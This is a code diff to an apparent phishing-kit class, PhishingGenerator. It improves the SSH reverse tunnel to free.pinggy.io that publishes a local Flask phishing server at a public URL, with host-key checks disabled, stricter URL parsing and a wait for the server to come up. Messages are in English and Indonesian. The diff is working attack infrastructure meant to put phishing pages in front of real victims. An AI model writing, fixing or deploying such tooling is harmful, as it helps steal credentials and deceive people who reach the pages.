@@ -839,44 +839,57 @@ class PhishingGenerator:
         import re
         addr = str(self.server_port)
         console.print(f"[cyan]⟳ Starting Pinggy tunnel on port {addr}...[/]")
-        console.print("[dim](Pinggy provides HTTP/HTTPS URLs accessible from any browser)[/]")
+        console.print("[dim]🌐 Pinggy provides HTTP/HTTPS URLs accessible from any browser[/]")
         try:
             self.tunnel_process = subprocess.Popen(
-                ["ssh", "-p", "443", "-R", f"0:localhost:{addr}", "-o", "StrictHostKeyChecking=no",
-                 "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes", "free.pinggy.io"],
+                ["ssh", "-N", "-T", "-p", "443", "-R", f"0:localhost:{addr}",
+                 "-o", "StrictHostKeyChecking=no",
+                 "-o", "UserKnownHostsFile=/dev/null",
+                 "-o", "ServerAliveInterval=30",
+                 "-o", "ServerAliveCountMax=3",
+                 "-o", "ExitOnForwardFailure=yes",
+                 "-o", "BatchMode=yes",
+                 "-o", "PasswordAuthentication=no",
+                 "-o", "LogLevel=ERROR",
+                 "free.pinggy.io"],
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
             )
             url = None
-            start = time.time()
             output_log = []
-            while time.time() - start < 25:
+            start = time.time()
+            while time.time() - start < 30:
                 try:
                     line = self.tunnel_process.stdout.readline()
+                    if not line:
+                        time.sleep(0.2)
+                        continue
+                    line = line.strip()
                     if line:
-                        line = line.strip()
                         output_log.append(line)
-                        urls = re.findall(r'https?://[^\s\'\"<>]+', line)
-                        for u in urls:
-                            if 'pinggy' in u or 'localhost' not in u:
-                                url = u.rstrip('/.')
-                                break
+                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*[a-z0-9](?::\d+)?(?:/[^\s\'\"<>]*)?', line)
+                    for u in urls:
+                        u = u.rstrip('/.')
+                        if 'pinggy' in u:
+                            url = u
+                            break
                 except:
                     pass
                 if url:
                     break
             if not url:
                 for line in output_log:
-                    urls = re.findall(r'https?://[^\s\'\"<>]+', line)
+                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*[a-z0-9](?::\d+)?(?:/[^\s\'\"<>]*)?', line)
                     for u in urls:
-                        if 'pinggy' in u or ('trycloudflare' not in u and 'ngrok' not in u):
-                            url = u.rstrip('/.')
+                        u = u.rstrip('/.')
+                        if 'pinggy' in u:
+                            url = u
                             break
                     if url:
                         break
             if url:
                 self.server_url = url
                 console.print(f"[green]✅ Pinggy tunnel: {url}[/]")
-                console.print(f"[dim]🌐 {'Accessible from any browser' if self.language == 'en' else 'Dapat diakses dari browser mana pun'}[/]")
+                console.print(f"[dim]🌐 {url} {'— accessible from any browser' if self.language == 'en' else '— bisa diakses dari browser mana pun'}[/]")
             else:
                 raise Exception("Could not parse Pinggy URL. Output: " + ' | '.join(output_log[-5:]))
         except Exception as e:
@@ -1280,7 +1293,17 @@ class PhishingGenerator:
             )
             flask_thread.daemon = True
             flask_thread.start()
-            time.sleep(1)
+
+            # Wait for Flask to actually bind the port
+            for _ in range(10):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect(('127.0.0.1', self.server_port))
+                    s.close()
+                    break
+                except:
+                    time.sleep(0.5)
 
             self.setup_tunnel()
             
